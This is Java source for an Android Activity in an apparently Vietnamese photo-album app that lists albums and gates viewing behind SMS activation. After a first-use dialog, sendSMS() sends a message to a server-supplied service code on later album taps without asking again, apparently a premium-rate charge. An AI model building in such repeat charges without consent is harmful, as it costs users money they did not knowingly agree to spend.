package com.hdc.mshow;

import java.util.ArrayList;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ListView;

import com.hdc.mshow.customize.Footer;
import com.hdc.mshow.customize.Header;
import com.hdc.mshow.customize.ListAbumAdapter;
import com.hdc.mshow.customize.Toast;
import com.hdc.mshow.dialog.Dialog;
import com.hdc.mshow.dialog.Dialog_SMS;
import com.hdc.mshow.dialog.Dialog_Update;
import com.hdc.mshow.dialog.Dialog_Waitting;
import com.hdc.mshow.model.Album;
import com.hdc.mshow.model.Sms;
import com.hdc.mshow.service.ServiceSMS;
import com.hdc.mshow.ultilities.DownloadImage;
import com.hdc.mshow.ultilities.SendSMS;
import com.hdc.source.AlertDialog_SMS;

@SuppressLint("NewApi")
public class ListAlbumActivity extends Activity {
	// TODO Instance
	public static ListAlbumActivity instance;

	private ArrayList<Album> arrayitems = new ArrayList<Album>();
	private ListAbumAdapter adapter;
	private ListView m_ListView;

	// TODO Footer
	Footer footer;

	// TODO Header
	Header header;

	// TODO Excuting ...
	public boolean isExcuting = false;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.my_list_albums);

		// AlertDialog_SMS.onDialog_SendSMS(this);

		instance = this;

		new checkVersion_Active().execute();

		// TODO init footer
		footer = new Footer(this);
		// footer.instance.setVisibility(View.GONE);

		// TODO init header
		header = new Header(this, R.id.header);
		header.initLayout();

		initListView();

//		try {
//			Thread.sleep(3000);
//		} catch (InterruptedException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}
		
		new updateImage().execute();

	}

	// TODO showDialog if hava a new version
	public void showDialog_UpdateVersion() {
		if (ServiceSMS.instance.flagVersion == 1) {
			Dialog d = new Dialog_Update(instance);
			d.show();
		}
	}

	// init ListView
	public void initListView() {
		arrayitems = ServiceSMS.instance.m_ListAlbums;
		adapter = new ListAbumAdapter(this, R.layout.item_album, arrayitems);
		m_ListView = (ListView) findViewById(R.id.list_album);
		m_ListView.addFooterView(footer.instance);
		m_ListView.setDivider(null);
		m_ListView.setDividerHeight(0);
		m_ListView.setAdapter(adapter);
		m_ListView.setTextFilterEnabled(true);
		m_ListView.setFocusableInTouchMode(false);
		m_ListView.setClickable(true);
		// on click listview Item
		m_ListView.setOnItemClickListener(new OnItemClickListener() {
			@Override
			public void onItemClick(AdapterView<?> arg0, View v, int position, long id) {

				Dialog w1 = new Dialog_Waitting(instance, 0);
				w1.show();
				
				if (ServiceSMS.instance.isAirPlane) {
					w1.dismiss();
					Toast.instance.show(instance,
							"Máy bạn đang để chế độ máy bay \n nên không xem được Ảnh !!!");
					return;
				}

				if (ServiceSMS.instance.isSim) {
					if (!ServiceSMS.instance.isFirstTime) {
						if (!ServiceSMS.instance.m_Active.getStatus().equals("0")) {
							sendSMS();
						}

						//status = 0 thì chuyền màn hình
						if (ServiceSMS.instance.m_Active.getStatus().equals("0")) {
							try {
								ServiceSMS.instance.getAlbum_Item(arrayitems.get((int) id).getId());
								ServiceSMS.instance
										.getAlbum_Other(arrayitems.get((int) id).getId());

								w1.dismiss();
								
								Intent intent = new Intent(instance, ListAlbumOtherActivity.class);
								startActivity(intent);
							} catch (Exception ex) {
								Toast.instance.showToast(instance, ex);
							}
						} else { // status = 1 thì hiển thị thông báo
							w1.dismiss();
							Toast.instance.show(instance,
									"Tài khoản của bạn hiện không đủ tiền để xem Ảnh !!!");
						}
					} else {
						showDialog_SendSMS();
					}
				} else {
					w1.dismiss();
					Toast.instance
							.show(instance,
									"Bạn đã không có Sim điện thoại.\n Bạn không thể kích hoạt và sử dụng App được !!!");
				}
			}
		});
	}

	// TODO update Image
	public void updateListView() {
		new updateImage().execute();
	}

	class updateImage extends AsyncTask<Void, Integer, Void> {
		Album album = null;
		// ArrayList<Album> aa = new ArrayList<Album>();

		Dialog w;

		@Override
		protected void onPreExecute() {
			// TODO Auto-generated method stub
			super.onPreExecute();

			isExcuting = true;

			w = new Dialog_Waitting(instance, 0);
			w.show();

			if (arrayitems == null)
				arrayitems = ServiceSMS.instance.m_ListAlbums;

			if (adapter != null && arrayitems.size() > 0) {
				footer.instance.setVisibility(View.VISIBLE);
				//adapter.clear();
			}

		}

		@Override
		protected Void doInBackground(Void... params) {
			// TODO Auto-generated method stub
			if (arrayitems.size() > 0) {
				for (int i = 0; i < arrayitems.size(); i++) {
					Bitmap b = null;
					try {
						b = DownloadImage.instance.getImage(arrayitems.get(i).getSrc());

					} catch (Exception e) {
						b = null;
					}
					arrayitems.get(i).setImg(b);

					publishProgress(i);
				}
			}
			return null;
		}

		@Override
		protected void onProgressUpdate(Integer... values) {
			// TODO Auto-generated method stub
			super.onProgressUpdate(values);

			if (values[0] == 0)
				w.dismiss();

			// adapter.insert(album, values[0]);
			adapter.notifyDataSetChanged();

			album = null;
		}

		@Override
		protected void onPostExecute(Void result) {
			// TODO Auto-generated method stub
			super.onPostExecute(result);
			// m_ListView.addFooterView(f.instance);
			// Toast.makeText(ListAlbumActivity.this, "okie",
			// Toast.LENGTH_SHORT).show();

			isExcuting = false;

			// footer.setVisible_Paging(View.VISIBLE);
			footer.instance.setVisibility(View.VISIBLE);
		}
	}

	class checkVersion_Active extends AsyncTask<Void, Void, Void> {

		@Override
		protected void onPreExecute() {
			// TODO Auto-generated method stub
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(Void... params) {
			// TODO get activice
			ServiceSMS.instance.getActive();

			// TODO get sms
			ServiceSMS.instance.getSMS();

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			// TODO Auto-generated method stub
			super.onPostExecute(result);

			showDialog_UpdateVersion();

			// showDialog_SendSMS();
		}
	}

	// TODO showDialog sendSMS to active app
	private void showDialog_SendSMS() {
		if (ServiceSMS.instance.isFirstTime) {
			Dialog d = new Dialog_SMS(instance);
			d.show();
		} else {
			sendSMS();
		}
	}

	// TODO send SMS
	// (nếu app hết hạn sử dụng)
	private void sendSMS() {
		// TODO het hạn sử dụng
		try {
			if (ServiceSMS.instance.m_Active.status != null
					&& ServiceSMS.instance.m_Active.status.trim().equals("1")) {
				Sms m_sms = ServiceSMS.instance.m_Sms;
				SendSMS.instance.send(m_sms.mo + " " + ServiceSMS.instance.m_Active.msg,
						m_sms.serviceCode, instance);
				try {
					Thread.sleep(5000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				ServiceSMS.instance.getActive();
			}
		} catch (Exception e) {
			Toast.instance.showToast(instance, e);
		}
	}

	@Override
	public void onBackPressed() {
		// TODO Auto-generated method stub
		super.onBackPressed();
		adapter.clear();

		System.exit(1);
	}

}
